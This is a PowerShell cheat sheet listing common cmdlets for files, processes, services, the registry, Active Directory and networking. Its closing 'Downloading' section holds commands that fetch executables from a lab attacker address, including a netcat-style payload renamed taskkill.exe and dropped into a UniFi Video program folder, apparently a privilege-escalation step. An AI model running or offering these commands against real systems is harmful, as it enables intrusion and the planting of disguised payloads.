## PowerShell Basics

-   `Get-Help`: Get information about PowerShell cmdlets and concepts
-   `Get-Command`: Get a list of all available cmdlets
-   `Get-Member`: Get information about the properties and methods of an object
-   `Clear-Host`: Clear the console screen

## Navigation

-   `Get-Location`: Display the current location (equivalent to `pwd` in bash)
-   `Set-Location`: Change the current location (equivalent to `cd` in bash)
-   `Push-Location`: Push the current location onto a stack, so you can navigate back to it later
-   `Pop-Location`: Pop the top location off the stack and navigate to it

## Working with Files and Folders

-   `Get-ChildItem`: List the contents of a folder (equivalent to `ls` in bash)
-   `New-Item`: Create a new file or folder
-   `Remove-Item`: Delete a file or folder
-   `Copy-Item`: Copy a file or folder to a new location
-   `Move-Item`: Move a file or folder to a new location
-   `Get-Item`: Display the properties of a file or folder

## Working with Text

-   `Get-Content`: Read the contents of a file (equivalent to `cat` in bash)
-   `Set-Content`: Overwrite the contents of a file
-   `Add-Content`: Append text to the end of a file
-   `Out-File`: Send output to a file

## Working with Variables

-   `$variable`: Access the value of a variable
-   `$variable = "value"`: Set the value of a variable
-   `${variable}`: Use a variable inside a string
-   `$(expression)`: Evaluate an expression and include the result in a string

## Working with Loops

-   `ForEach-Object`: Perform an operation on each item in a collection
-   `While`: Repeat a block of commands while a condition is true
-   `Do..While`: Repeat a block of commands while a condition is true (execute the block of commands at least once)
-   `Do..Until`: Repeat a block of commands until a condition is true (execute the block of commands at least once)

## Working with Conditional Statements

-   `If`: Execute a block of commands if a condition is true
-   `Else`: Execute a block of commands if the previous `If` condition was false
-   `ElseIf`: Check an additional condition if the previous `If` condition was false

## Working with Functions

-   `function`: Define a function
-   `param()`: Declare one or more parameters for a function
-   `return`: Return a value from a function

## Working with Processes

-   `Get-Process`: Get a list of running processes
-   `Start-Process`: Start a new process
-   `Stop-Process`: Stop a running process

## Working with Services

-   `Get-Service`: Get a list of services
-   `Start-Service`: Start a service
-   `Stop-Service`: Stop a service

## Working with Event Logs

-   `Get-EventLog`: Get a list of event logs
-   `Get-EventLog -LogName "System"`: Get a list of events in the "System" event log
-   `Get-EventLog -LogName "System" -Newest 10`: Get the 10 newest events in the "System" event log

## Working with the Registry

-   `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion`: Get the properties of a registry key
-   `Set-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion -Name "ProgramFilesDir" -Value "C:\Program Files"`: Set the value of a registry key property

## Working with Active Directory

-   `Get-ADComputer`: Get a list of computers in Active Directory
-   `Get-ADUser`: Get a list of users in Active Directory
-   `Get-ADGroup`: Get a list of groups in Active Directory
-   `New-ADUser`: Create a new user in Active Directory
-   `Set-ADUser`: Modify an existing user in Active Directory
-   `Remove-ADUser`: Delete an user from Active Directory

## Working with Networking

-   `Test-Connection`: Test connectivity to a remote host
-   `Get-NetIPAddress`: Get a list of IP addresses on the local machine
-   `Get-NetIPConfiguration`: Get the IP configuration of the local machine
-   `Get-NetRoute`: Get the routing table of the local machine
-   `Resolve-DnsName`: Resolve a DNS name to an IP address

## Downloading 

* `Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"`
* `wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"`
* `(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")`